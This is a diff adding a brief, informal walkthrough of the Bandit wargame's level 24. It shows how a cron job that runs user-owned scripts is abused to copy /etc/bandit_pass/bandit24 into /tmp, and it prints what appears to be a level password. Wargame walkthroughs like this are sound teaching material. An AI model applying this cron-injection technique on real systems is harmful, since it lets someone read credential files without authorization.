@@ -1,0 +1,20 @@
+Again follow the cronjobs and you will found that there is a script, and that script run all the script owned by your user.
+You just have to write your own script, and inject it to the folder. Here is the script that i write:
+
+cd /tmp
+mkdir <temporary>
+cd <temporary>
+vi script.sh
+
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 >> /tmp/scripts/bandit24_pass
+
+
+After that, change the permission on the file to permit all user to be able to read it, modify and execute it.
+chmod 777 script.sh
+
+then, move it to the folder
+
+cp script.sh /var/spool/bandit24/foo
